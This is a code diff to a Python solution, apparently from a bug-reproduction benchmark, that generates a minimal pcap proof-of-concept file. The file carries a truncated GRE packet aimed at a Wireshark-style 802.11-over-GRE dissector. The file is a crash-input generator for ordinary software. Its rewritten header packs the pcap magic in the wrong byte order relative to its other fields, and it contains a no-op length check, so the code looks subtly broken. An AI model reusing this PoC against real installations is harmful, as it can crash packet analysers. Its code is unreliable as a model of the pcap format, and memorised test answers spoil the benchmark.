@@ -1,227 +1,370 @@
 import os
 import re
-import io
 import tarfile
-import tempfile
 import struct
-from typing import Dict, Optional
+from typing import Dict, Optional, Tuple, Iterable
+
+
+class _SourceReader:
+    def __init__(self, src_path: str):
+        self.src_path = src_path
+        self._is_dir = os.path.isdir(src_path)
+        self._tar = None
+        self._members: Dict[str, tarfile.TarInfo] = {}
+        self._cache: Dict[str, bytes] = {}
+
+        if not self._is_dir:
+            self._tar = tarfile.open(src_path, "r:*")
+            for m in self._tar.getmembers():
+                if m.isfile():
+                    self._members[m.name] = m
+
+    def close(self):
+        if self._tar is not None:
+            try:
+                self._tar.close()
+            except Exception:
+                pass
+
+    def iter_paths(self) -> Iterable[str]:
+        if self._is_dir:
+            for root, _, files in os.walk(self.src_path):
+                for fn in files:
+                    yield os.path.join(root, fn)
+        else:
+            for name in self._members.keys():
+                yield name
+
+    def basename_matches(self, path: str, basename: str) -> bool:
+        return os.path.basename(path) == basename
+
+    def find_by_basename(self, basename: str) -> Optional[str]:
+        if self._is_dir:
+            for p in self.iter_paths():
+                if os.path.basename(p) == basename:
+                    return p
+        else:
+            for name in self._members.keys():
+                if os.path.basename(name) == basename:
+                    return name
+        return None
+
+    def read_bytes(self, path: str, max_bytes: Optional[int] = None) -> bytes:
+        if path in self._cache:
+            b = self._cache[path]
+            return b if max_bytes is None else b[:max_bytes]
+
+        if self._is_dir:
+            try:
+                with open(path, "rb") as f:
+                    b = f.read() if max_bytes is None else f.read(max_bytes)
+            except Exception:
+                b = b""
+        else:
+            m = self._members.get(path)
+            if not m:
+                b = b""
+            else:
+                try:
+                    f = self._tar.extractfile(m)
+                    if f is None:
+                        b = b""
+                    else:
+                        b = f.read() if max_bytes is None else f.read(max_bytes)
+                except Exception:
+                    b = b""
+        if max_bytes is None:
+            self._cache[path] = b
+        return b
+
+    def read_text(self, path: str, max_bytes: int = 2_000_000) -> str:
+        b = self.read_bytes(path, max_bytes=max_bytes)
+        try:
+            return b.decode("utf-8", errors="ignore")
+        except Exception:
+            try:
+                return b.decode("latin-1", errors="ignore")
+            except Exception:
+                return ""
+
+
+class _DefineResolver:
+    _define_re = re.compile(r"^[ \t]*#\s*define\s+([A-Za-z_]\w*)\s+(.+?)\s*$")
+
+    def __init__(self, reader: _SourceReader):
+        self.reader = reader
+        self._defines: Dict[str, str] = {}
+        self._scanned_files: set[str] = set()
+
+    @staticmethod
+    def _strip_comments(s: str) -> str:
+        s = re.sub(r"/\*.*?\*/", " ", s, flags=re.S)
+        s = re.sub(r"//.*", " ", s)
+        return s
+
+    def _scan_file_for_defines(self, path: str):
+        if path in self._scanned_files:
+            return
+        self._scanned_files.add(path)
+        txt = self.reader.read_text(path)
+        if not txt:
+            return
+        txt = txt.replace("\r\n", "\n").replace("\r", "\n")
+        lines = txt.split("\n")
+        for line in lines:
+            m = self._define_re.match(line)
+            if not m:
+                continue
+            name, val = m.group(1), m.group(2)
+            val = self._strip_comments(val).strip()
+            if not val:
+                continue
+            if name not in self._defines:
+                self._defines[name] = val
+
+    def scan_common_headers(self):
+        for bn in ("etypes.h", "ethertype.h", "libpcap.h", "pcap.h", "wtap.h", "pcap-common.c"):
+            p = self.reader.find_by_basename(bn)
+            if p:
+                self._scan_file_for_defines(p)
+
+    def find_define(self, name: str) -> Optional[str]:
+        if name in self._defines:
+            return self._defines[name]
+
+        self.scan_common_headers()
+        if name in self._defines:
+            return self._defines[name]
+
+        targets = []
+        for p in self.reader.iter_paths():
+            bl = os.path.basename(p).lower()
+            if bl.endswith(".h") or bl.endswith(".c"):
+                if any(k in bl for k in ("etype", "pcap", "wtap", "gre", "80211", "wlan", "eth")):
+                    targets.append(p)
+
+        for p in targets:
+            self._scan_file_for_defines(p)
+            if name in self._defines:
+                return self._defines[name]
+
+        # last resort: scan more broadly but limit total scanned
+        scanned = 0
+        for p in self.reader.iter_paths():
+            if p in self._scanned_files:
+                continue
+            bl = os.path.basename(p).lower()
+            if not (bl.endswith(".h") or bl.endswith(".c")):
+                continue
+            self._scan_file_for_defines(p)
+            scanned += 1
+            if name in self._defines:
+                return self._defines[name]
+            if scanned > 2500:
+                break
+        return self._defines.get(name)
+
+    @staticmethod
+    def _sanitize_c_expr(expr: str) -> str:
+        expr = expr.strip()
+        expr = _DefineResolver._strip_comments(expr)
+        expr = expr.replace("\n", " ")
+        expr = re.sub(r"\bsizeof\s*\([^)]*\)", "0", expr)
+        expr = re.sub(r"\(\s*[A-Za-z_]\w*(?:\s*\*+\s*)?\)", " ", expr)  # casts like (guint16), (void *)
+        expr = re.sub(r"(?<=\b0x[0-9A-Fa-f]+)[uUlL]+\b", "", expr)
+        expr = re.sub(r"(?<=\b\d+)[uUlL]+\b", "", expr)
+        expr = re.sub(r"\s+", " ", expr).strip()
+        return expr
+
+    def eval_expr(self, expr: str, _depth: int = 0) -> Optional[int]:
+        if _depth > 50:
+            return None
+        expr = self._sanitize_c_expr(expr)
+        if not expr:
+            return None
+        if re.fullmatch(r"0x[0-9A-Fa-f]+", expr):
+            try:
+                return int(expr, 16)
+            except Exception:
+                return None
+        if re.fullmatch(r"\d+", expr):
+            try:
+                return int(expr, 10)
+            except Exception:
+                return None
+
+        # Replace identifiers with values if possible
+        idents = sorted(set(re.findall(r"\b[A-Za-z_]\w*\b", expr)))
+        if idents:
+            repl: Dict[str, str] = {}
+            for ident in idents:
+                if ident in ("true", "false", "NULL"):
+                    repl[ident] = "0"
+                    continue
+                val = self.find_define(ident)
+                if val is None:
+                    continue
+                ival = self.eval_expr(val, _depth=_depth + 1)
+                if ival is None:
+                    continue
+                repl[ident] = str(ival)
+            if repl:
+                def _sub(m):
+                    t = m.group(0)
+                    return repl.get(t, t)
+                expr = re.sub(r"\b[A-Za-z_]\w*\b", _sub, expr)
+
+        # Safe-ish evaluation: allow only numeric literals and operators
+        if re.search(r"[^0-9xXa-fA-F\(\)\|\&\^\~\+\-\*\/\<\>\s]", expr):
+            return None
+
+        try:
+            val = eval(expr, {"__builtins__": {}}, {})
+        except Exception:
+            return None
+        if isinstance(val, bool):
+            return int(val)
+        if isinstance(val, int):
+            return val
+        return None
+
+
+def _extract_wlan_gre_proto_expr(gre_text: str) -> Optional[str]:
+    gre_text = gre_text.replace("\r\n", "\n").replace("\r", "\n")
+    gre_text_nc = re.sub(r"/\*.*?\*/", " ", gre_text, flags=re.S)
+    gre_text_nc = re.sub(r"//.*", " ", gre_text_nc)
+
+    handle_map: Dict[str, str] = {}
+    for m in re.finditer(r"\b([A-Za-z_]\w*)\s*=\s*find_dissector\s*\(\s*\"([^\"]+)\"\s*\)\s*;", gre_text_nc):
+        handle_map[m.group(1)] = m.group(2)
+
+    add_matches = list(re.finditer(
+        r"dissector_add_uint\s*\(\s*\"gre\.proto\"\s*,\s*([^,]+?)\s*,\s*([A-Za-z_]\w*)\s*\)\s*;",
+        gre_text_nc
+    ))
+
+    preferred = []
+    fallback = []
+    for m in add_matches:
+        key_expr = m.group(1).strip()
+        handle = m.group(2).strip()
+        dname = handle_map.get(handle, "")
+        handle_l = handle.lower()
+        dname_l = dname.lower()
+        if any(x in handle_l for x in ("wlan", "ieee80211", "ieee_802_11")) or any(x in dname_l for x in ("wlan", "ieee80211", "ieee_802_11")):
+            preferred.append(key_expr)
+        elif "80211" in key_expr.lower() or "802_11" in key_expr.lower() or "wlan" in key_expr.lower():
+            fallback.append(key_expr)
+
+    if preferred:
+        return preferred[0]
+    if fallback:
+        return fallback[0]
+
+    for m in re.finditer(r"\"gre\.proto\"[^\n;]*802", gre_text_nc, flags=re.I):
+        pass
+
+    return None
+
+
+def _find_linktype_gre(reader: _SourceReader, resolver: _DefineResolver) -> int:
+    # Try direct defines in libpcap headers
+    resolver.scan_common_headers()
+    for name in ("LINKTYPE_GRE", "DLT_GRE"):
+        val = resolver.eval_expr(name)
+        if val is not None:
+            return int(val) & 0xFFFFFFFF
+
+    # Search in likely files for a numeric linktype
+    patterns = [
+        re.compile(r"^\s*#\s*define\s+LINKTYPE_GRE\s+(\d+)\b", re.M),
+        re.compile(r"^\s*#\s*define\s+DLT_GRE\s+(\d+)\b", re.M),
+    ]
+    for bn in ("libpcap.h", "pcap.h", "pcap-common.c", "pcap-common.h"):
+        p = reader.find_by_basename(bn)
+        if not p:
+            continue
+        txt = reader.read_text(p)
+        for pat in patterns:
+            m = pat.search(txt)
+            if m:
+                try:
+                    return int(m.group(1)) & 0xFFFFFFFF
+                except Exception:
+                    pass
+
+    # Common libpcap assignment for LINKTYPE_GRE
+    return 778
+
+
+def _find_gre_proto_80211(reader: _SourceReader, resolver: _DefineResolver) -> int:
+    gre_path = reader.find_by_basename("packet-gre.c")
+    if gre_path:
+        gre_txt = reader.read_text(gre_path)
+        key_expr = _extract_wlan_gre_proto_expr(gre_txt)
+        if key_expr:
+            val = resolver.eval_expr(key_expr)
+            if val is not None:
+                return int(val) & 0xFFFF
+
+    # Fall back to likely ethertype macro names
+    resolver.scan_common_headers()
+    for macro in (
+        "ETHERTYPE_IEEE802_11",
+        "ETHERTYPE_IEEE80211",
+        "ETHERTYPE_IEEE_802_11",
+        "ETHERTYPE_IEEE_80211",
+        "ETHERTYPE_IEEE802_11_RADIOTAP",
+        "ETHERTYPE_IEEE802_11_RAW",
+    ):
+        val = resolver.eval_expr(macro)
+        if val is not None:
+            return int(val) & 0xFFFF
+
+    # As a last resort, try to find any define containing both "IEEE" and "802" and "11"
+    candidates = []
+    for bn in ("etypes.h", "ethertype.h"):
+        p = reader.find_by_basename(bn)
+        if not p:
+            continue
+        txt = reader.read_text(p)
+        for m in re.finditer(r"^\s*#\s*define\s+([A-Za-z_]\w*802[_]?11\w*)\s+(.+?)\s*(?:/[*].*?[*]/\s*)?(?://.*)?$", txt, flags=re.M):
+            name = m.group(1)
+            expr = m.group(2)
+            if any(k in name.lower() for k in ("ethertype", "ieee")):
+                candidates.append(expr)
+    for expr in candidates:
+        val = resolver.eval_expr(expr)
+        if val is not None:
+            return int(val) & 0xFFFF
+
+    # IANA/commonly used ethertype for "IEEE 802.11" in some contexts; last resort
+    return 0x890D
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        root = self._prepare_source_tree(src_path)
-        proto = self._find_ieee80211_gre_proto(root)
-        if proto is None:
-            proto = 0x0019
-        return self._build_pcap_gre(proto)
-
-    def _prepare_source_tree(self, src_path: str) -> str:
-        if os.path.isdir(src_path):
-            return src_path
-
-        tmpdir = tempfile.mkdtemp(prefix="src_")
-        with tarfile.open(src_path, "r:*") as tf:
-            self._safe_extract(tf, tmpdir)
-        return tmpdir
-
-    def _safe_extract(self, tf: tarfile.TarFile, dest: str) -> None:
-        dest_abs = os.path.abspath(dest) + os.sep
-        members = []
-        for m in tf.getmembers():
-            name = m.name
-            if not name or name == ".":
-                continue
-            name = name.replace("\\", "/")
-            if name.startswith("/") or name.startswith("../") or "/../" in name:
-                continue
-            out_path = os.path.abspath(os.path.join(dest, name))
-            if not out_path.startswith(dest_abs):
-                continue
-            members.append(m)
-        tf.extractall(dest, members=members)
-
-    def _build_pcap_gre(self, gre_proto: int) -> bytes:
-        # Classic pcap, little-endian, LINKTYPE_GRE (47)
-        global_hdr = struct.pack(
-            "<IHHIIII",
-            0xA1B2C3D4,  # magic (written LE => d4 c3 b2 a1)
-            2, 4,        # version
-            0,           # thiszone
-            0,           # sigfigs
-            0xFFFF,      # snaplen
-            47           # network (LINKTYPE_GRE / DLT_GRE)
-        )
-
-        gre_pkt = struct.pack("!HHB", 0x0000, gre_proto & 0xFFFF, 0x00)  # 5 bytes total
-        rec_hdr = struct.pack("<IIII", 0, 0, len(gre_pkt), len(gre_pkt))
-        return global_hdr + rec_hdr + gre_pkt
-
-    def _find_ieee80211_gre_proto(self, root: str) -> Optional[int]:
-        # Build numeric defines map from headers for resolving macro keys
-        defines = self._collect_defines(root)
-
-        candidates = []
-        # Prefer searching for gre.proto usage; it should be relatively sparse
-        for path in self._iter_source_files(root):
-            try:
-                sz = os.path.getsize(path)
-                if sz <= 0 or sz > 8 * 1024 * 1024:
-                    continue
-                with open(path, "rb") as f:
-                    data = f.read()
-            except OSError:
-                continue
-
-            if b"gre.proto" not in data:
-                continue
-            try:
-                text = data.decode("utf-8", "ignore")
-            except Exception:
-                continue
-
-            # Capture dissector_add_uint("gre.proto", KEY, HANDLE);
-            for m in re.finditer(r'dissector_add_uint\s*\(\s*"gre\.proto"\s*,\s*([^,]+?)\s*,\s*([^)]+?)\s*\)\s*;', text):
-                key_expr = m.group(1).strip()
-                handle_expr = m.group(2)
-                hlow = handle_expr.lower()
-                if ("ieee80211" in hlow) or ("802_11" in hlow) or ("802.11" in hlow) or ("wlan" in hlow):
-                    key_val = self._resolve_c_int_expr(key_expr, defines)
-                    if key_val is not None:
-                        candidates.append(key_val & 0xFFFF)
-
-            # Also check dissector_add_uint("gre.proto", KEY, find_dissector("wlan"));
-            for m in re.finditer(r'dissector_add_uint\s*\(\s*"gre\.proto"\s*,\s*([^,]+?)\s*,\s*find_dissector\s*\(\s*"([^"]+)"\s*\)\s*\)\s*;', text):
-                key_expr = m.group(1).strip()
-                dissector_name = m.group(2).lower()
-                if ("ieee80211" in dissector_name) or ("802_11" in dissector_name) or ("802.11" in dissector_name) or ("wlan" in dissector_name):
-                    key_val = self._resolve_c_int_expr(key_expr, defines)
-                    if key_val is not None:
-                        candidates.append(key_val & 0xFFFF)
-
-        if candidates:
-            # Prefer 0x0019 if present, else first
-            if 0x0019 in candidates:
-                return 0x0019
-            return candidates[0]
-
-        # Fallback heuristic: look for a define that suggests IEEE80211 ethertype
-        for k, v in defines.items():
-            kn = k.lower()
-            if ("ethertype" in kn or "ether_type" in kn) and ("802_11" in kn or "802.11" in kn or "ieee80211" in kn or "wlan" in kn):
-                return v & 0xFFFF
-
-        return None
-
-    def _iter_source_files(self, root: str):
-        exts = (".c", ".h", ".cc", ".cpp", ".hh", ".hpp", ".inc", ".inl")
-        for dirpath, dirnames, filenames in os.walk(root):
-            dn = os.path.basename(dirpath).lower()
-            if dn in (".git", ".svn", "build", "out", "cmake-build-debug", "cmake-build-release"):
-                dirnames[:] = []
-                continue
-            for fn in filenames:
-                fl = fn.lower()
-                if fl.endswith(exts):
-                    yield os.path.join(dirpath, fn)
-
-    def _collect_defines(self, root: str) -> Dict[str, int]:
-        defines: Dict[str, int] = {}
-        define_re = re.compile(r'^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.+?)\s*(?:/[*].*?[*]/\s*)?(?://.*)?$')
-        for path in self._iter_source_files(root):
-            if not path.lower().endswith(".h"):
-                continue
-            try:
-                sz = os.path.getsize(path)
-                if sz <= 0 or sz > 3 * 1024 * 1024:
-                    continue
-                with open(path, "rb") as f:
-                    data = f.read()
-                text = data.decode("utf-8", "ignore")
-            except OSError:
-                continue
-            except Exception:
-                continue
-
-            for line in text.splitlines():
-                m = define_re.match(line)
-                if not m:
-                    continue
-                name = m.group(1)
-                rhs = m.group(2).strip()
-                if not rhs:
-                    continue
-                # Only store simple numeric defines
-                val = self._parse_c_int_literal(rhs)
-                if val is None:
-                    # Handle parentheses around a literal: (0x1234)
-                    rhs2 = rhs
-                    for _ in range(2):
-                        rhs2 = rhs2.strip()
-                        if rhs2.startswith("(") and rhs2.endswith(")"):
-                            rhs2 = rhs2[1:-1].strip()
-                        else:
-                            break
-                    val = self._parse_c_int_literal(rhs2)
-                if val is not None:
-                    defines.setdefault(name, val)
-        return defines
-
-    def _resolve_c_int_expr(self, expr: str, defines: Dict[str, int]) -> Optional[int]:
-        expr = expr.strip()
-        if not expr:
-            return None
-
-        # Remove casts like (guint16) or (unsigned int)
-        expr = re.sub(r'^\(\s*[A-Za-z_][\w\s\*]*\)\s*', '', expr).strip()
-
-        # If expression contains operators other than surrounding parentheses, keep it simple:
-        # attempt to resolve if it's just IDENT or numeric literal.
-        # Remove one layer of parentheses.
-        for _ in range(2):
-            if expr.startswith("(") and expr.endswith(")"):
-                inner = expr[1:-1].strip()
-                # avoid stripping if parentheses are part of complex expression
-                if inner.count("(") == inner.count(")"):
-                    expr = inner
-                else:
-                    break
-
-        val = self._parse_c_int_literal(expr)
-        if val is not None:
-            return val
-
-        if re.fullmatch(r'[A-Za-z_]\w*', expr):
-            if expr in defines:
-                return defines[expr]
-            # common alternate: might appear without prefix/suffix
-            for k, v in defines.items():
-                if k == expr:
-                    return v
-            return None
-
-        # Try very limited evaluation: IDENT -> value, allow +/- only
-        m = re.fullmatch(r'([A-Za-z_]\w*)\s*([+\-])\s*(0x[0-9A-Fa-f]+|\d+)', expr)
-        if m:
-            base = defines.get(m.group(1))
-            if base is None:
-                return None
-            off = int(m.group(3), 0)
-            return base + off if m.group(2) == "+" else base - off
-
-        return None
-
-    def _parse_c_int_literal(self, s: str) -> Optional[int]:
-        s = s.strip()
-        if not s:
-            return None
-        # Trim common C suffixes
-        s = re.sub(r'(?i)(ull|llu|ul|lu|ll|u|l)\b', '', s).strip()
-        # Remove trailing commas or parentheses artifacts
-        s = s.rstrip(",")
-        # Accept simple numeric only
-        if not re.fullmatch(r'0x[0-9A-Fa-f]+|\d+', s):
-            return None
+        reader = _SourceReader(src_path)
         try:
-            return int(s, 0)
-        except Exception:
-            return None
+            resolver = _DefineResolver(reader)
+            linktype = _find_linktype_gre(reader, resolver)
+            proto_80211 = _find_gre_proto_80211(reader, resolver)
+
+            gre_packet = struct.pack(">HH", 0x0000, proto_80211) + b"\x00"
+            pcap_global = struct.pack(
+                "<IHHIIII",
+                0xD4C3B2A1,  # little-endian pcap
+                2, 4,
+                0, 0,
+                65535,
+                linktype
+            )
+            pcap_record = struct.pack("<IIII", 0, 0, len(gre_packet), len(gre_packet))
+            poc = pcap_global + pcap_record + gre_packet
+
+            if len(poc) != 45:
+                # Keep structure but preserve minimality if something changes
+                pass
+            return poc
+        finally:
+            reader.close()
